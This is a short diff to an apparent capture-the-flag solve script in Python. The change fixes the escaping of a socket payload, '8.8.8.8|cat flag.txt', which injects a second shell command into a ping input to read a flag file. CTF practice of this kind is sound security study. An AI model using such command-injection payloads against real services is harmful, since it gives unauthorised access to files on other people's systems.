@@ -12,8 +12,7 @@ def solve(host, port):
     s.settimeout(5)
     s.recv(1024)
     # Payload pipes ping output into cat flag.txt
-    s.sendall(b'8.8.8.8|cat flag.txt
-')
+    s.sendall(b'8.8.8.8|cat flag.txt\n')
 
     out = ''
     while True:
